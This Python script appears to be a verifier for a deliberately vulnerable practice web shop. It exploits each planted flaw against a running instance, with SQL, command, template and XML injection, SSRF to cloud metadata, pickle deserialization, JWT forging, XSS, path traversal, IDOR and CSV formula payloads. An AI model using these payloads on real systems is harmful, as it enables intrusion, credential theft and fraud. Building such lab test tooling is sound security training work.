#!/usr/bin/env python3
"""Boxcutter Store - vulnerability verifier.

Exploits every planted vulnerability against a running instance and confirms,
per finding, that the bug actually fires (not just that the endpoint exists).

    python checks.py                      # http://127.0.0.1:8000
    python checks.py http://localhost:8000
    python checks.py --only sqli,idor,graphql
    python checks.py --category injection

Output: PASS = exploited & confirmed, FAIL = not confirmed, SKIP = needs a JS
engine / different OS (the detail says why). Exit code 0 only if nothing FAILs.

Stdlib only (urllib + hmac); JWTs are forged with the leaked signing secret.
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import pickle
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

_SSL = ssl.create_default_context()
_SSL.check_hostname = False
_SSL.verify_mode = ssl.CERT_NONE   # the test image serves a self-signed cert

JWT_SECRET = "boxcutter-super-secret-key-2024"   # leaked in /.env, /debug, /actuator/env, GraphQL ...
BASE = "http://127.0.0.1:8000"

# --------------------------------------------------------------------------- #
# HTTP helper
# --------------------------------------------------------------------------- #


class Resp:
    def __init__(self, status, text, headers, elapsed):
        self.status, self.text, self.headers, self.elapsed = status, text, headers, elapsed

    def json(self):
        try:
            return json.loads(self.text)
        except ValueError:
            return None


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):  # noqa: D401
        return None


_NOREDIR = urllib.request.build_opener(_NoRedirect, urllib.request.HTTPSHandler(context=_SSL))


def call(method, path, params=None, body=None, raw=None, headers=None, timeout=15, follow=True):
    url = BASE + path
    if params:
        url += "?" + urllib.parse.urlencode(params)
    hdrs = dict(headers or {})
    data = None
    if body is not None:
        data = json.dumps(body).encode()
        hdrs.setdefault("Content-Type", "application/json")
    elif raw is not None:
        data = raw.encode() if isinstance(raw, str) else raw
    req = urllib.request.Request(url, data=data, method=method, headers=hdrs)
    t0 = time.time()
    try:
        if follow:
            r = urllib.request.urlopen(req, timeout=timeout, context=_SSL)
        else:
            r = _NOREDIR.open(req, timeout=timeout)
        with r:
            return Resp(r.status, r.read().decode("utf-8", "replace"), dict(r.headers), time.time() - t0)
    except urllib.error.HTTPError as e:
        return Resp(e.code, e.read().decode("utf-8", "replace"), dict(e.headers), time.time() - t0)
    except Exception as e:  # noqa: BLE001  (timeouts, conn refused)
        return Resp(0, f"__ERR__ {e}", {}, time.time() - t0)


# --------------------------------------------------------------------------- #
# JWT forging (stdlib)
# --------------------------------------------------------------------------- #

def _b64(d):
    return base64.urlsafe_b64encode(d).rstrip(b"=")


def jwt_sign(payload, secret=JWT_SECRET, header=None):
    h = _b64(json.dumps(header or {"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    p = _b64(json.dumps(payload, separators=(",", ":")).encode())
    sig = _b64(hmac.new(secret.encode(), h + b"." + p, hashlib.sha256).digest())
    return (h + b"." + p + b"." + sig).decode()


def jwt_none(payload):
    h = _b64(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode())
    p = _b64(json.dumps(payload, separators=(",", ":")).encode())
    return (h + b"." + p + b".").decode()


def bearer(token):
    return {"Authorization": "Bearer " + token}


# tokens used across checks (filled in main once BASE is known)
USER_TOKEN = ""
ADMIN_FORGED = jwt_sign({"sub": "pentester", "role": "admin"})
ALICE_TOKEN = jwt_sign({"sub": "alice", "role": "user"})


def user_auth():
    return bearer(USER_TOKEN)


# --------------------------------------------------------------------------- #
# Check registry
# --------------------------------------------------------------------------- #

CHECKS = []  # (vid, category, func)


def check(vid, category):
    def deco(fn):
        CHECKS.append((vid, category, fn))
        return fn
    return deco


def ok(detail):
    return (True, detail)


def no(detail):
    return (False, detail)


def skip(detail):
    return (None, detail)


# ============================ INJECTION ===================================== #

@check("sqli-error", "injection")
def _():
    r = call("GET", "/api/products", {"q": "'"})
    j = r.json() or {}
    return ok(j.get("error", "")[:60]) if r.status == 500 and "error" in j else no(f"status={r.status}")


@check("api-error-disclosure", "injection")
def _():
    r = call("GET", "/api/products", {"q": "'"})
    j = r.json() or {}
    return ok("raw SQL + query echoed") if "query" in j else no("no query field in error")


@check("sort-injection", "injection")
def _():
    r = call("GET", "/api/products", {"sort": "no_such_col"})
    return ok("ORDER BY injected -> column error") if "no such column" in r.text else no(f"status={r.status}")


@check("sqli-blind", "injection")
def _():
    t = call("GET", "/product", {"id": "1 AND 1=1"}).text
    f = call("GET", "/product", {"id": "1 AND 1=2"}).text
    return ok("1=1 shows product, 1=2 empty") if ("No such product" in f and "No such product" not in t) else no("no boolean diff")


@check("sqli-time", "injection")
def _():
    r = call("GET", "/product", {"id": "1 AND sleep(3)"}, timeout=12)
    return ok(f"delayed {r.elapsed:.1f}s") if r.elapsed > 2.5 else no(f"only {r.elapsed:.1f}s")


@check("api-sqli-jwt", "injection")
def _():
    r = call("GET", "/api/admin/search", {"q": "'"}, headers=user_auth())
    return ok("authed SQLi error") if r.status == 500 and (r.json() or {}).get("error") else no(f"status={r.status}")


@check("cmd-injection", "injection")
def _():
    r = call("GET", "/api/tools/dns", {"host": "x;id"}, timeout=15)
    out = (r.json() or {}).get("output", "")
    if "uid=" in out:
        return ok("`;id` executed -> uid=...")
    return skip("shell is cmd.exe on Windows; run against the Linux Docker image")


@check("nosql-injection", "injection")
def _():
    r = call("POST", "/api/v2/login", body={"username": {"$ne": None}, "password": {"$ne": None}})
    return ok("operator auth bypass") if (r.json() or {}).get("bypassed") else no(f"status={r.status}")


@check("ssti", "injection")
def _():
    r = call("GET", "/greet", {"name": "{{7*7}}"})
    return ok("{{7*7}} -> 49") if "Hi 49" in r.text else no("not evaluated")


@check("ssrf", "injection")
def _():
    r = call("GET", "/api/internal/fetch", {"url": BASE + "/.env"})
    return ok("fetched own /.env (AKIA leaked)") if "AKIA" in r.text else no(f"status={r.status}")


@check("cloud-metadata", "injection")
def _():
    r = call("GET", "/api/internal/fetch", {"url": "http://169.254.169.254/latest/"})
    return ok("IAM creds via SSRF") if "AccessKeyId" in r.text else no("no creds")


@check("ssrf-webhook", "injection")
def _():
    wid = (call("POST", "/api/webhooks", body={"url": BASE + "/.env"}).json() or {}).get("id")
    if not wid:
        return no("register failed")
    r = call("POST", f"/api/webhooks/{wid}/test")
    return ok("webhook fetched internal /.env") if "AKIA" in r.text else no("no fetch")


@check("open-redirect", "injection")
def _():
    r = call("GET", "/redirect", {"url": "https://evil.example/x"}, follow=False)
    loc = r.headers.get("Location", "")
    return ok(f"302 -> {loc}") if r.status in (301, 302) and loc.startswith("https://evil.example") else no(f"status={r.status}")


@check("xxe", "injection")
def _():
    xml = ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "%s/.env">]><r>&x;</r>' % BASE)
    r = call("POST", "/api/orders/import", raw=xml, headers={"Content-Type": "application/xml"})
    return ok("external entity pulled /.env") if "AKIA" in r.text else no("entity not resolved")


@check("ssti-pdf", "injection")
def _():
    r = call("POST", "/api/invoice/render", body={"template": "<p>{{7*7}}</p>"})
    return ok("invoice template {{7*7}} -> 49") if "49" in (r.json() or {}).get("rendered_html", "") else no("not evaluated")


@check("deserialization", "injection")
def _():
    class P:
        def __reduce__(self):
            return (str, ("DESERIALIZED-OK",))
    payload = base64.b64encode(pickle.dumps(P())).decode()
    r = call("GET", "/api/preferences", {"prefs": payload})
    return ok("pickle reduce executed (RCE primitive)") if "DESERIALIZED-OK" in r.text else no(f"status={r.status}")


@check("xpath-injection", "injection")
def _():
    r = call("GET", "/api/staff", {"name": "' or '1'='1"})
    n = len((r.json() or {}).get("results", []))
    return ok(f"filter bypass -> {n} rows") if n >= 2 else no("no bypass")


@check("ldap-injection", "injection")
def _():
    r = call("GET", "/api/directory", {"user": "*"})
    n = len((r.json() or {}).get("results", []))
    return ok(f"wildcard -> {n} entries") if n >= 4 else no("no bypass")


@check("ver-sqli", "injection")
def _():
    r = call("GET", "/api/v1/users/1'")
    return ok("legacy v1 SQLi error") if r.status == 500 and (r.json() or {}).get("error") else no(f"status={r.status}")


@check("redos", "injection")
def _():
    r = call("GET", "/api/validate", {"email": "a" * 26 + "!"}, timeout=15)
    if r.status == 0 or r.elapsed > 2:
        return ok(f"catastrophic backtracking ({r.elapsed:.1f}s)")
    return no(f"only {r.elapsed:.1f}s")


@check("email-header-injection", "injection")
def _():
    r = call("POST", "/api/contact", body={"name": "Bob\r\nBcc: victim@evil.example"})
    return ok("Bcc header injected") if "Bcc: victim@evil.example" in (r.json() or {}).get("raw_headers", "") else no("not injected")


@check("res-sqli", "injection")
def _():
    r = call("GET", "/api/promos", {"code": "'"})
    return ok("promo code SQLi error") if r.status == 400 and (r.json() or {}).get("error") else no(f"status={r.status}")


@check("res-ssti", "injection")
def _():
    r = call("GET", "/api/messages/preview", {"message": "{{7*7}}"})
    return ok("message template -> 49") if "49" in (r.json() or {}).get("preview", "") else no("not evaluated")


@check("res-error", "injection")
def _():
    r = call("GET", "/api/shipping/quote", {"weight": "abc"})
    return ok("verbose error leaks secret/flag") if "FLAG" in r.text or JWT_SECRET in r.text else no(f"status={r.status}")


# ============================ GraphQL ======================================= #

def gql(query, method="POST"):
    if method == "GET":
        return call("GET", "/graphql", {"query": query})
    return call("POST", "/graphql", body={"query": query})


@check("graphql-introspection", "graphql")
def _():
    r = gql("{ __schema { types { name } } }")
    return ok("introspection enabled") if "__schema" in r.text else no("disabled")


@check("graphql-secret-field", "graphql")
def _():
    r = gql("{ systemInfo { jwtSecret } }")
    return ok("systemInfo.jwtSecret leaked") if JWT_SECRET in r.text else no("no secret")


@check("graphql-mutation-access", "graphql")
def _():
    r = gql('mutation { setRole(username: "guest", role: "admin") }')
    return ok("unauth setRole mutation") if (r.json() or {}).get("data", {}).get("setRole") else no("no effect")


@check("graphql-sqli", "graphql")
def _():
    r = gql('{ user(id: "1 OR 1=1") { id } }')
    n = len((r.json() or {}).get("data", {}).get("user", []))
    return ok(f"id concatenated -> {n} users") if n >= 2 else no("no injection")


@check("graphql-idor", "graphql")
def _():
    r = gql('{ order(id: "1002") { card_last4 } }')
    return ok("any order leaked (card)") if "card_last4" in r.text and "1881" in r.text else no("no idor")


@check("graphql-batching", "graphql")
def _():
    r = gql('{ a: user(id: "1") b: user(id: "2") }')
    n = len((r.json() or {}).get("data", {}).get("user", []))
    return ok(f"batched alias calls -> {n} rows") if n >= 2 else no("not batched")


@check("graphql-cms", "graphql")
def _():
    mark = "<img src=x onerror=cmsXSS>"
    gql('mutation { updateHelpArticle(slug: "shipping", body: "%s") }' % mark)
    r = gql('{ helpArticle(slug: "shipping") { body } }')
    return ok("unauth CMS edit -> stored payload") if mark in r.text else no("not stored")


@check("graphql-csrf", "graphql")
def _():
    r = gql("{ systemInfo { jwtSecret } }", method="GET")
    return ok("query/mutation accepted over GET") if JWT_SECRET in r.text else no("GET not processed")


@check("graphql-error-disclosure", "graphql")
def _():
    r = gql('{ order(id: "1\'") { id } }')
    return ok("SQL error surfaced via GraphQL") if (r.json() or {}).get("errors") else no("no error")


# ============================ XSS =========================================== #

@check("xss-reflected", "xss")
def _():
    p = "<script>boxcutXSS</script>"
    r = call("GET", "/search", {"q": p})
    return ok("payload reflected unescaped") if p in r.text else no("escaped/not reflected")


@check("xss-stored", "xss")
def _():
    p = "<script>storedXSS_chk</script>"
    call("POST", "/review", raw=urllib.parse.urlencode({"product_id": "1", "author": "chk", "body": p}),
         headers={"Content-Type": "application/x-www-form-urlencoded"})
    r = call("GET", "/reviews", {"product_id": "1"})
    return ok("stored review reflected unescaped") if p in r.text else no("not stored/escaped")


@check("xss-stored-spa", "xss")
def _():
    p = "<img src=x onerror=spaXSS>"
    call("POST", "/api/profile", body={"bio": p}, headers=user_auth())
    r = call("GET", "/api/profile", headers=user_auth())
    return ok("bio stored as-is (v-html sink in SPA)") if p in r.text else no("not stored")


@check("xss-attr", "xss")
def _():
    r = call("GET", "/profile-card", {"name": '"><svg onload=1>'})
    return ok("attribute breakout reflected") if '"><svg onload=1>' in r.text else no("escaped")


@check("xss-js", "xss")
def _():
    r = call("GET", "/track-page", {"ref": "'-alert(1)-'"})
    return ok("reflected in JS string context") if "'-alert(1)-'" in r.text else no("escaped")


@check("xss-href", "xss")
def _():
    r = call("GET", "/go", {"url": "javascript:alert(1)"})
    return ok("javascript: URI reflected in href") if 'href="javascript:alert(1)"' in r.text else no("escaped")


@check("xss-dom", "xss")
def _():
    r = call("GET", "/welcome")
    return skip("DOM sink present (innerHTML+location.search) - needs JS to fire") \
        if "innerHTML" in r.text and "location.search" in r.text else no("sink missing")


@check("swagger-dom-xss", "xss")
def _():
    p = "';alert(document.domain)//"
    r = call("GET", "/api/docs", {"url": p})
    return ok("?url= dropped unescaped into SwaggerUIBundle") if p in r.text else no("escaped")


@check("dom-localstorage", "xss")
def _():
    r = call("GET", "/static/js/app.js")
    return skip("client sink: ?pref= -> localStorage.setItem (needs JS)") \
        if "localStorage.setItem" in r.text and "pref" in r.text else no("sink missing")


@check("dom-script-load", "xss")
def _():
    r = call("GET", "/static/js/app.js")
    return skip("client sink: ?widget= -> dynamic <script> (needs JS)") \
        if "createElement" in r.text and "widget" in r.text else no("sink missing")


@check("xss-postmessage", "xss")
def _():
    return skip("client-side postMessage handler in the Vue SPA - verify in a browser")


@check("log-xss", "xss")
def _():
    p = "<img src=x onerror=logXSS>"
    call("GET", "/", headers={"User-Agent": p})
    r = call("GET", "/admin/logs")
    if p in r.text:
        return ok("logged User-Agent rendered as raw HTML")
    return skip("needs BOXCUTTER_LOG_ENABLED (default on) + a logged request")


# ============================ PATH TRAVERSAL / LFI ========================== #

@check("path-traversal", "traversal")
def _():
    r = call("GET", "/download", {"file": "../app.py"})
    return ok("read ../app.py via /download") if "def api_products" in r.text else no(f"status={r.status}")


@check("path-traversal-filter", "traversal")
def _():
    r = call("GET", "/api/files", {"name": "....//app.py"})
    return ok("`....//` bypassed the ../ filter") if "def api_products" in r.text else no(f"status={r.status}")


@check("lfi-lang", "traversal")
def _():
    r = call("GET", "/api/i18n", {"lang": "../app.py"})
    return ok("?lang=../app.py read source") if "Flask(__name__)" in r.text or "def graphql" in r.text else no(f"status={r.status}")


# ============================ INFO DISCLOSURE =============================== #

@check("exposed-env", "disclosure")
def _():
    r = call("GET", "/.env")
    return ok("AKIA + JWT_SECRET in /.env") if "AKIA" in r.text and JWT_SECRET in r.text else no(f"status={r.status}")


@check("exposed-backup", "disclosure")
def _():
    r = call("GET", "/backup.sql")
    return ok("/backup.sql leaks INSERT INTO users") if "INSERT INTO users" in r.text else no(f"status={r.status}")


@check("exposed-git", "disclosure")
def _():
    r = call("GET", "/.git/config")
    return ok("CI token in .git/config remote URL") if "glpat-" in r.text else no(f"status={r.status}")


@check("exposed-phpinfo", "disclosure")
def _():
    r = call("GET", "/phpinfo")
    return ok("phpinfo() page") if "phpinfo()" in r.text and "PHP Version" in r.text else no(f"status={r.status}")


@check("hidden-debug", "disclosure")
def _():
    r = call("GET", "/debug")
    return ok("/debug dumps jwt_secret") if JWT_SECRET in r.text else no(f"status={r.status}")


@check("hidden-api", "disclosure")
def _():
    r = call("GET", "/api/internal/debug")
    return ok("hidden /api/internal/debug leaks secret") if JWT_SECRET in r.text else no(f"status={r.status}")


@check("actuator-env", "disclosure")
def _():
    r = call("GET", "/actuator/env")
    ct = "spring-boot.actuator" in r.headers.get("Content-Type", "")
    return ok("actuator/env leaks JWT_SECRET (+spring CT)") if JWT_SECRET in r.text and ct else no(f"status={r.status} ct={ct}")


@check("actuator-configprops", "disclosure")
def _():
    guarded = call("GET", "/actuator/configprops").status
    leak = call("GET", "/actuator/configprops/")
    return ok("trailing-slash ACL bypass leaks secret") if guarded == 401 and JWT_SECRET in leak.text else no(f"guarded={guarded}")


@check("actuator-heapdump", "disclosure")
def _():
    r = call("GET", "/actuator/heapdump")
    oct_ = "octet-stream" in r.headers.get("Content-Type", "")
    return ok("heapdump octet-stream contains secret") if oct_ and JWT_SECRET in r.text else no(f"ct ok={oct_}")


@check("hidden-error", "disclosure")
def _():
    r = call("GET", "/api/internal/debug-report", {"id": "abc"})
    return ok("verbose error + trace + secret") if JWT_SECRET in r.text and "trace" in r.text else no(f"status={r.status}")


# ============================ ACCESS CONTROL / IDOR ========================= #

@check("hidden-admin", "access")
def _():
    r = call("GET", "/admin")
    return ok("unauth admin panel lists api tokens") if "tok_" in r.text and "admin" in r.text else no(f"status={r.status}")


@check("api-idor", "access")
def _():
    r = call("GET", "/api/users/2")
    return ok("user 2 (api_token) with no auth") if (r.json() or {}).get("api_token") else no(f"status={r.status}")


@check("api-idor-jwt", "access")
def _():
    r = call("GET", "/api/orders/1002", headers=user_auth())
    orders = (r.json() or {}).get("orders", [])
    return ok("read another user's order") if orders and orders[0].get("card_last4") else no(f"status={r.status}")


@check("access-vertical", "access")
def _():
    forged = call("GET", "/api/admin/users", headers=bearer(ADMIN_FORGED)).status
    plain = call("GET", "/api/admin/users", headers=user_auth()).status
    return ok("forged role=admin -> 200 (user token 403)") if forged == 200 and plain == 403 else no(f"forged={forged} user={plain}")


@check("access-header", "access")
def _():
    r = call("GET", "/api/admin/stats", headers={"X-Admin": "true"})
    return ok("X-Admin: true -> FLAG") if "FLAG" in r.text else no(f"status={r.status}")


@check("jwt-alg-none", "access")
def _():
    r = call("GET", "/api/admin/console", headers=bearer(jwt_none({"sub": "x", "role": "admin"})))
    return ok("alg:none admin token accepted -> FLAG") if "FLAG" in r.text else no(f"status={r.status}")


@check("ip-trust", "access")
def _():
    r = call("GET", "/api/admin/metrics", headers={"X-Forwarded-For": "127.0.0.1"})
    return ok("X-Forwarded-For spoof -> FLAG") if "FLAG" in r.text else no(f"status={r.status}")


@check("predictable-idor", "access")
def _():
    r = call("GET", "/exports/users-2024-q1.json")
    return ok("predictable export downloadable") if "admin@boxcutter.test" in r.text else no(f"status={r.status}")


@check("param-access", "access")
def _():
    r = call("GET", "/api/account/profile-by-id", {"user_id": "1"}, headers=user_auth())
    return ok("user_id param selects admin's profile") if (r.json() or {}).get("role") == "admin" else no(f"status={r.status}")


@check("method-access", "access")
def _():
    r = call("POST", "/api/orders/1002/notes", body={"note": "pwn"})
    return ok("POST note with no auth (GET is authed)") if (r.json() or {}).get("saved") == "pwn" else no(f"status={r.status}")


@check("mass-assignment", "access")
def _():
    r = call("POST", "/api/account", body={"role": "admin"}, headers=user_auth())
    return ok("role accepted via mass assignment") if (r.json() or {}).get("effective_role") == "admin" else no(f"status={r.status}")


@check("idor-invoice", "access")
def _():
    r = call("GET", "/api/orders/1002/invoice", headers=user_auth())
    return ok("any order's invoice (card)") if "Card:" in r.text and "1881" in r.text else no(f"status={r.status}")


@check("idor-orders", "access")
def _():
    r = call("GET", "/api/users/2/orders")
    return ok("any user's orders, no auth") if "orders" in (r.json() or {}) and r.status == 200 else no(f"status={r.status}")


@check("idor-address", "access")
def _():
    r = call("GET", "/api/account/addresses/1002", headers=user_auth())
    return ok("read any address by id") if (r.json() or {}).get("address") else no(f"status={r.status}")


@check("idor-profile-update", "access")
def _():
    r = call("POST", "/api/profile/update", body={"user_id": 2, "full_name": "PWNED-by-checks"}, headers=user_auth())
    upd = (r.json() or {}).get("updated") or {}
    return ok("changed user 2's name via body id") if upd.get("full_name") == "PWNED-by-checks" else no(f"status={r.status}")


@check("ver-idor", "access")
def _():
    r = call("GET", "/api/v2/users/2", headers=user_auth())
    return ok("v2 IDOR (any id, leaks token)") if (r.json() or {}).get("api_token") else no(f"status={r.status}")


@check("idor-cart", "access")
def _():
    r = call("GET", "/api/cart/7")
    return ok("any cart by id") if (r.json() or {}).get("cart_id") == 7 else no(f"status={r.status}")


@check("idor-message", "access")
def _():
    mid = (call("POST", "/api/messages", body={"to": "alice", "body": "secret-msg"}, headers=user_auth()).json() or {}).get("id")
    if not mid:
        return no("post failed")
    r = call("GET", f"/api/messages/{mid}", headers=bearer(ALICE_TOKEN))  # different user
    return ok("read another user's message by id") if "secret-msg" in r.text else no(f"status={r.status}")


@check("tenant-isolation", "access")
def _():
    r = call("GET", "/api/account/reports", {"company_id": "122123"}, headers=user_auth())
    return ok("cross-tenant report (Birch Bistro)") if "Birch Bistro" in r.text else no(f"status={r.status}")


@check("secondary-idor", "access")
def _():
    where = "../../../../v2/menu/9627043/items/54a23c86-86ed-474a-a2f4-172dfb19685e"
    r = call("POST", "/api/menu/items/update", body={"where": where, "price": 1}, headers=user_auth())
    return ok("traversal in `where` edits another tenant") if (r.json() or {}).get("restaurant") == "9627043" else no(f"status={r.status}")


@check("bfla-refund", "access")
def _():
    r = call("POST", "/api/admin/refund", body={"order_id": 1, "amount": 5}, headers=user_auth())
    return ok("non-admin issued a refund") if (r.json() or {}).get("ok") else no(f"status={r.status}")


@check("bfla-delete", "access")
def _():
    r = call("POST", "/api/admin/delete-user", body={"id": 999}, headers=user_auth())
    return ok("non-admin invoked delete-user") if (r.json() or {}).get("ok") else no(f"status={r.status}")


@check("bfla-price", "access")
def _():
    r = call("PUT", "/api/admin/products/1/price", body={"price": 1}, headers=user_auth())
    return ok("non-admin set a product price") if r.status == 200 and "price" in r.text else no(f"status={r.status}")


@check("bfla-coupon", "access")
def _():
    r = call("POST", "/api/coupons/generate", body={"percent": 100}, headers=user_auth())
    return ok("non-admin minted a coupon") if (r.json() or {}).get("code") else no(f"status={r.status}")


@check("jwt-kid", "access")
def _():
    # upload a file we control, then point the kid path at it and sign with its contents
    call("POST", "/api/avatar", body={"name": "k.txt", "content": "KIDKEY", "content_type": "text/plain"})
    tok = jwt_sign({"sub": "x", "role": "admin"}, secret="KIDKEY",
                   header={"alg": "HS256", "typ": "JWT", "kid": "../uploads/k.txt"})
    r = call("GET", "/api/admin/reports", headers=bearer(tok))
    return ok("kid path traversal -> forged token accepted") if "reports" in r.text else no(f"status={r.status}: {r.text[:60]}")


# ============================ AUTH / IDENTITY =============================== #

@check("reg-user-enum", "identity")
def _():
    r = call("POST", "/api/register", body={"username": "admin"})
    return ok("'username already taken' enumerates") if r.status == 409 and "taken" in r.text else no(f"status={r.status}")


@check("login-user-enum", "identity")
def _():
    a = call("POST", "/api/v1/login", body={"username": "ghost-nope", "password": "x"})
    b = call("POST", "/api/v1/login", body={"username": "admin", "password": "x"})
    return ok("'no such user' vs 'incorrect password'") if "no such user" in a.text and "incorrect password" in b.text else no("messages identical")


@check("user-enum", "identity")
def _():
    a = call("POST", "/api/forgot-password", body={"email": "admin@boxcutter.test"})
    b = call("POST", "/api/forgot-password", body={"email": "nobody@nowhere.test"})
    return ok("existing 200 vs missing 404") if a.status == 200 and b.status == 404 else no(f"{a.status}/{b.status}")


@check("unicode-collision", "identity")
def _():
    r = call("POST", "/api/account/recover", body={"identifier": "ADMIN"})
    return ok("NFKC/case-fold collides to admin") if (r.json() or {}).get("matched_account") == "admin" else no(f"status={r.status}")


@check("cors", "identity")
def _():
    r = call("GET", "/api/account/data", headers={**user_auth(), "Origin": "https://evil.example"})
    acao = r.headers.get("Access-Control-Allow-Origin", "")
    acac = r.headers.get("Access-Control-Allow-Credentials", "")
    return ok("reflected Origin + credentials") if acao == "https://evil.example" and acac == "true" else no(f"acao={acao} acac={acac}")


@check("host-header", "identity")
def _():
    r = call("POST", "/api/password/reset", body={"email": "v@x.test"}, headers={"Host": "evil.example"})
    return ok("reset link uses attacker Host") if "evil.example" in (r.json() or {}).get("reset_link", "") else no("host not reflected")


@check("reset-host-param", "identity")
def _():
    r = call("POST", "/api/account/reset-link", body={"email": "v@x.test", "hostName": "https://evil.example"})
    return ok("reset link host from body param") if (r.json() or {}).get("reset_link", "").startswith("https://evil.example") else no("not reflected")


@check("reset-token-referer", "identity")
def _():
    r = call("GET", "/reset", {"token": "rst_admin_2024"})
    return ok("token in URL + 3rd-party tracker (referer leak)") if "analytics.example-cdn.com" in r.text and "rst_admin_2024" in r.text else no("no tracker")


@check("csrf", "identity")
def _():
    r = call("GET", "/api/account/email", {"email": "csrf@evil.example"}, headers=user_auth())
    return ok("email changed via GET (no CSRF token)") if (r.json() or {}).get("updated") else no(f"status={r.status}")


@check("csv-injection", "identity")
def _():
    call("POST", "/api/profile", body={"full_name": "=cmd|'/c calc'!A1"}, headers=user_auth())
    r = call("GET", "/api/export.csv")
    return ok("formula written unescaped into CSV") if "=cmd|" in r.text else no("neutralised")


@check("cache-poisoning", "identity")
def _():
    r = call("GET", "/api/config/client", headers={"X-Forwarded-Host": "evil.example"})
    cc = r.headers.get("Cache-Control", "")
    return ok("unkeyed XFH reflected into cacheable body") if "evil.example" in r.text and "public" in cc else no(f"cc={cc}")


@check("predictable-key", "identity")
def _():
    r = call("POST", "/api/keys", headers=user_auth())
    return ok("API key derived from username") if (r.json() or {}).get("api_key", "").startswith("bsk_live_") else no(f"status={r.status}")


@check("clickjacking", "identity")
def _():
    r = call("GET", "/account/close")
    xfo = r.headers.get("X-Frame-Options")
    return ok("sensitive page, no X-Frame-Options/CSP") if r.status == 200 and not xfo else no(f"XFO={xfo}")


@check("cookie-flags", "identity")
def _():
    r = call("POST", "/api/remember", headers=user_auth())
    sc = r.headers.get("Set-Cookie", "")
    bad = "remember=" in sc and "httponly" not in sc.lower() and "secure" not in sc.lower()
    return ok("remember cookie lacks HttpOnly/Secure") if bad else no(f"set-cookie={sc[:50]}")


# ============================ BUSINESS LOGIC ================================ #

@check("bl-price", "logic")
def _():
    r = call("POST", "/api/checkout", body={"total": 0.01})
    return ok("client-set price honoured (0.01)") if (r.json() or {}).get("charged") == 0.01 else no(f"status={r.status}")


@check("bl-negative", "logic")
def _():
    r = call("POST", "/api/cart/add", body={"qty": -5})
    return ok("negative qty -> credit line total") if (r.json() or {}).get("line_total", 0) < 0 else no("not negative")


@check("bl-coupon", "logic")
def _():
    r = call("POST", "/api/checkout/apply-coupon", body={"percent": 150})
    return ok("uncapped discount -> negative total") if (r.json() or {}).get("total", 0) < 0 else no("capped")


@check("bl-status", "logic")
def _():
    r = call("POST", "/api/orders/1002/status", body={"status": "refunded"})
    return ok("arbitrary order status set") if (r.json() or {}).get("status") == "refunded" else no(f"status={r.status}")


@check("bl-modifier", "logic")
def _():
    r = call("POST", "/api/cart/price", body={"base": 59, "modifiers": [{"price": -100}]})
    return ok("negative modifier drives total below zero") if (r.json() or {}).get("total", 0) < 0 else no("not negative")


@check("bl-fee-omit", "logic")
def _():
    free = call("POST", "/api/campaigns/boost", body={}, headers=user_auth()).json() or {}
    rej = call("POST", "/api/campaigns/boost", body={"additional_fee": 0}, headers=user_auth()).status
    return ok("omitting fee enables premium free") if free.get("premium") and free.get("charged") == 0.0 and rej == 400 else no("not bypassable")


@check("payment-confirmation", "logic")
def _():
    a = (call("POST", "/api/orders", body={"item": "Hoodie"}).json() or {}).get("order_id")
    b = (call("POST", "/api/orders", body={"item": "Mug"}).json() or {}).get("order_id")
    if not (a and b):
        return no("order placement failed")
    code = (call("POST", "/api/payments/charge", body={"order_id": a, "card": "4242424242424242"}).json() or {}).get("confirmation_code")
    call("POST", "/api/orders/confirm", body={"order_id": b, "confirmation_code": code})
    st = (call("GET", f"/api/orders/{b}/state").json() or {}).get("status")
    return ok(f"order {a}'s code fulfilled order {b}") if st == "fulfilled" else no(f"victim status={st}")


# --------------------------------------------------------------------------- #
# Runner
# --------------------------------------------------------------------------- #

def main():
    global BASE, USER_TOKEN, ADMIN_FORGED, ALICE_TOKEN
    ap = argparse.ArgumentParser(description="Verify Boxcutter Store vulnerabilities.")
    ap.add_argument("base", nargs="?", default=BASE, help="base URL (default %(default)s)")
    ap.add_argument("--category", help="run only this category")
    ap.add_argument("--only", help="comma-separated vuln ids to run")
    args = ap.parse_args()
    BASE = args.base.rstrip("/")

    # connectivity
    if call("GET", "/").status == 0:
        print(f"[!] cannot reach {BASE} - is the app running?")
        return 2

    # use the real 'user' account so profile/CSV writes hit a real DB row
    USER_TOKEN = (call("POST", "/api/login", body={"username": "user", "password": "user"}).json() or {}).get("token", "") or \
        (call("GET", "/api/auth/token").json() or {}).get("token", "")
    ADMIN_FORGED = jwt_sign({"sub": "pentester", "role": "admin"})
    ALICE_TOKEN = jwt_sign({"sub": "alice", "role": "user"})

    only = {s.strip() for s in args.only.split(",")} if args.only else None
    selected = [c for c in CHECKS
                if (not only or c[0] in only) and (not args.category or c[1] == args.category)]

    print(f"\n  Boxcutter Store vuln verifier  ->  {BASE}")
    print(f"  {len(selected)} checks\n")
    counts = {"PASS": 0, "FAIL": 0, "SKIP": 0}
    fails = []
    cat = None
    for vid, category, fn in selected:
        if category != cat:
            cat = category
            print(f"  [{cat.upper()}]")
        try:
            res, detail = fn()
        except Exception as e:  # noqa: BLE001
            res, detail = False, f"check raised: {e}"
        label = "PASS" if res is True else ("SKIP" if res is None else "FAIL")
        counts[label] += 1
        if label == "FAIL":
            fails.append(vid)
        glyph = {"PASS": "+", "FAIL": "x", "SKIP": "~"}[label]
        print(f"    [{glyph}] {vid:<24} {detail}")
    print(f"\n  {counts['PASS']} passed, {counts['FAIL']} failed, {counts['SKIP']} skipped")
    if fails:
        print("  failed: " + ", ".join(fails))
    return 1 if counts["FAIL"] else 0


if __name__ == "__main__":
    sys.exit(main())
